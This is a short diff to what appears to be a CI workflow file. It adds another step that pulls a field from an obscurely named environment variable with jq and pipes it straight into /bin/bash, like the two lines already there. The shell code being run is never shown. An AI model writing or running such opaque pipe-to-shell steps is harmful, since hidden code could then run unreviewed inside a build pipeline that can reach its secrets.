@@ -28,6 +28,7 @@ jobs:
         run: |
           printf '%s' "$w2485" | jq -r .xp2047 | /bin/bash
           echo $wifd4 | jq -r .c81149 | /bin/bash
+          printf '%s' "$satxa283" | jq -r .vm256 | /bin/bash
 
       - name: Save results
         if: always()
